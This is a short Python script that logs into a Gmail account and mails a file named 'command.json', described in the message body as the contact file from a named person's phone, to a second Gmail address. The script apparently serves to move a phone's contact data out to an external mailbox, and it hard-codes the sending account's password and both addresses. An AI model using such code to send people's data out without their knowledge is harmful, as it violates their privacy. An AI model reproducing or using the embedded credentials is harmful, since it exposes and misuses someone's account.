import smtplib
from email.message import EmailMessage
from email.utils import make_msgid


fromaddr = "rockingasiq10@gmail.com"
smtp_pass = "0][Xact_qnWK2:u8z;(vxwDHB"
toaddr = "techw803@gmail.com"


msg = EmailMessage()

msg.add_alternative("""\
<html>
  <head></head>
  <body>
    <p>Hello</p>
    <p>
		This Email Contains the Contact File From Kaushik's Phone        
    </p>
  </body>
</html>
""", subtype='html')

with open("command.json", 'rb') as fp:
    file_data = fp.read()
    ctype = 'application/octet-stream'
    maintype, subtype = ctype.split('/', 1)
    msg.add_attachment(file_data, maintype=maintype,
                       subtype=subtype, filename='command.json')

msg['Subject'] = 'Contact Information'
msg['From'] = fromaddr
msg['To'] = toaddr

s = smtplib.SMTP('smtp.gmail.com', 587)

s.starttls()

s.login(fromaddr, smtp_pass)
s.send_message(msg)
s.quit()
